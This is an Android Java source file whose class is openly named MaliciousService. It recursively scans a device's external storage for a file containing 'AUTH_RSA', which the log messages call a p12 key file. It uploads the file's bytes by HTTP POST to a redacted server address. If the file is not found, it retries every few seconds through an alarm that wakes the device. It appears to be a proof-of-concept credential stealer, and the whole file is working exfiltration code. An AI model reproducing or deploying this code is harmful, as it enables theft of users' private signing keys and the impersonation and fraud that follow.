package kz.c.signscan;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class MaliciousService extends IntentService {

    private String TAG = "MalService";

    public MaliciousService() {
        super("MalService");
    }

    public void onCreate() {
        Log.d(TAG, "Malicious service created!");
        super.onCreate();
    }

    private static boolean containsSymlink(File file) throws IOException {
        return !file.getCanonicalFile().equals(file.getAbsoluteFile());
    }

    private String pwn2(File dir) {

        String path = null;
        try {

            File[] list = dir.listFiles();

            if (list == null) {
                Log.d(TAG, "list is null!");
                return null;
            }

            for (File f : list) {

                if (!containsSymlink(f)) {

                    //Log.d(TAG, f.getAbsolutePath());

                    if (f.isDirectory()) {
                        path = pwn2(f);
                        if (path != null)
                            return path;
                    } else {
                        path = f.getAbsolutePath();
                        if (path.contains("AUTH_RSA")) {
                            Log.d(TAG, "AUTH_RSA found here - " + path);
                            return path;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }
        return null;
    }

    private void scheduleMalService() {

        Context ctx = getApplicationContext();
        AlarmManager alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(ctx, MaliciousTaskManager.class);

        final int _id = (int) System.currentTimeMillis();
        PendingIntent alarmIntent = PendingIntent.getBroadcast(ctx, _id, intent, 0);

        alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() +
                5000, alarmIntent);
    }

    private byte[] readFileToByteArray(File file) throws IOException {
        FileInputStream fis = null;
        // Creating a byte array using the length of the file
        // file.length returns long which is cast to int
        byte[] bArray = new byte[(int) file.length()];
        fis = new FileInputStream(file);
        fis.read(bArray);
        fis.close();
        return bArray;
    }

    private void sendToServer(String path) {
        Log.d(TAG, "Sending p12 file to server");
        try {
            File file = new File(path);
            URL url = new URL("http://xxxxxxxxxx");
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setConnectTimeout(30 * 1000);

            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            urlConnection.setRequestProperty("Content-Type", "application/octet-stream");

            DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
            request.write(readFileToByteArray(file));
            request.flush();
            request.close();

            int respCode = urlConnection.getResponseCode();
            Log.d(TAG, "Return status code: " + respCode);

        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.d(TAG, "Searching external storage for p12 file...");
        File dir= Environment.getExternalStorageDirectory();
        String path = pwn2(dir);
        if (path == null) {
            Log.d(TAG, "AUTH_RSA missed!\n Trying again...");
            scheduleMalService();
        } else
            sendToServer(path);

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
